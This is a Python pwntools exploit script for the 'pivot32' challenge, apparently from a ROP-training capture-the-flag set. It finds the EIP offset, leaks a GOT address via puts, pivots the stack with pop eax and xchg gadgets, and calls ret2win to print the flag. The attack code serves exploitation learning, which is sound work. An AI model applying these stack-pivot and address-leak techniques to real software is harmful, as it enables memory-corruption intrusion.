#!/bin/usr/python3

from pwn import *
import re
def start():
	p = process("./pivot32")
	gdb.attach(p , gdbscript='''
		b main
		continue
	''')
	return p

context.binary = elf = ELF("./pivot32")
context.log_level = "debug"
context.delete_corefiles = True


def find_eip(payload):
    # Launch process and send payload
    p = process("./pivot32")
    p.sendlineafter('>', "")  # We need to deal with initial prompt
    # Then we can send payload (when it asks for stack smash)
    p.sendlineafter('>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP at the time of crashing
    eip_offset = cyclic_find(p.corefile.eip)
    info('located EIP offset at {a}'.format(a=eip_offset))
    # Return the EIP offset
    return eip_offset

# Pass in pattern_size, get back EIP offset
eip_offset = find_eip(cyclic(100))

io = start()
#pprint(elf.got)
#pprint(elf.plt)
foothold_got = elf.got.foothold_function
foothold_plt = elf.plt.foothold_function
puts_plt = elf.plt.puts

# Get out pivot address (this changes each time)
#pivot_addr = int(re.search(r"(0x[\w\d]+)", io.recvS()).group(0), 16)
pivot_addr = int(re.search(r"(0x[\w\d]+)", io.recvS()).group(0), 16)

rop = ROP(elf)
pop_eax = rop.find_gadget(["pop eax", "ret"])[0]
#xchg_eax = rop.find_gadget(["xchg"])[0]
xchg_eax_esp = 0x0804882e

# Offsets of the libpivot32 functions we want
foothold_offset = 0x77d
ret2win_offset = 0x974

# Print out important addresses
info("foothold_plt: %#x", foothold_plt)
info("foothold_got: %#x", foothold_got)
info("puts_plt: %#x", puts_plt)
info("pivot_addr: %#x", pivot_addr)
info("foothold_offset: %#x", foothold_offset)
info("ret2win_offset: %#x", ret2win_offset)
info("pop eax; ret; %#x", pop_eax)
info("xchg eax, esp; ret; %#x", xchg_eax_esp)

# Our first payload to leak the foothold_function@got address
payload = flat(
    # Need to call foothold_plt to populate GOT with function address
    foothold_plt,
    # Call puts to leak the foothold_got address
    puts_plt,
    elf.symbols.main,  # Exit address (we want to return here)
    foothold_got
)

# Send payload 1 to leak the address
info("Sending first payload to leak foothold_function@got address")
io.sendline(payload)

f = open("./payload", "wb")
#f.write(payload)
#f.close()

payload2 = flat(
	asm('nop') * eip_offset,
	pop_eax,
	pivot_addr,
	xchg_eax_esp	
)

f.write(payload + payload2)
f.close()
info("send payload2 to stack pivot")
io.sendlineafter(">", payload2)


# Receive text until beginning of leaked address
#io.recvlines(3)
#io.recvline()
#io.recvline()
# Extract and convert leaked address
leaked_got_addresses = io.recv()
info("leaked got addr = %s", leaked_got_addresses)
foothold_leak = unpack(leaked_got_addresses[:4].strip())
# Calculate offset to ret2win function
libpivot32_base = foothold_leak - foothold_offset
ret2win_addr = libpivot32_base + ret2win_offset

# Print out for confirmation
info("Leaked foothold_function@got:")
info("foothold_leak: %#x", foothold_leak)
info("libpivot32_base: %#x", libpivot32_base)
info("ret2win_addr: %#x", ret2win_addr)

# Our third (and final) payload to retrieve out flag
payload3 = flat(
    asm('nop') * eip_offset,  # Offset - 44 bytes
    ret2win_addr
)

# gdb.attach(io, gdbscript='init-pwndbg')

# Send payload 3 to ret2win
io.sendline(payload3)
io.recvuntil('Thank you!\n')

# Get our flag!
flag = io.recv()
success(flag)

